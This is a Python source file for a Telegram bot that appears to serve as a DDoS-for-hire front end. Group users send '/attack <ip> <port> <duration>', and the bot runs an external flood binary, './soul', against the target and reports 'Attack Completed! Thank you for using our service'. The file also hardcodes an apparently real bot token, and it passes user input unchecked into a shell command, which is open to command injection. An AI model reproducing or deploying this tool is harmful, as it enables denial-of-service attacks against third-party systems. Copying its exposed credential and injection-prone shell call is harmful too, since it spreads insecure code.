import os
import asyncio
from telegram import Update, Chat
from telegram.ext import Application, CommandHandler, CallbackContext

# Replace with your bot token
TELEGRAM_BOT_TOKEN = '7763302446:AAG35PcNxXhZaqz2mqhMLXFZLv5x1XUR1qs'

# Predefined list of authorized group IDs (replace these with actual group IDs)
AUTHORIZED_GROUPS = {-1002234966753, -1002234966753}  # Add your group IDs here

# Check if the group is authorized
def is_group_authorized(chat_id):
    return chat_id in AUTHORIZED_GROUPS

# Command: Authorize Group (optional)
async def authorize_group(update: Update, context: CallbackContext):
    chat = update.effective_chat
    if chat.type in [Chat.GROUP, Chat.SUPERGROUP]:
        group_id = chat.id
        AUTHORIZED_GROUPS.add(group_id)
        await context.bot.send_message(chat_id=group_id, text="✅ This group has been authorized to use the bot!")
    else:
        await update.message.reply_text("❌ This command can only be used in a group.")

# Command: Start
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if not is_group_authorized(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="❌ fuck ")
        return

    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Command: Run Attack
async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./soul {ip} {port} {duration} 900",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    else:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

# Command: Attack
async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if not is_group_authorized(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="❌ fuck .")
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

# Main Function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("authorize_group", authorize_group))  # Optional

    application.run_polling()

if __name__ == '__main__':
    main()
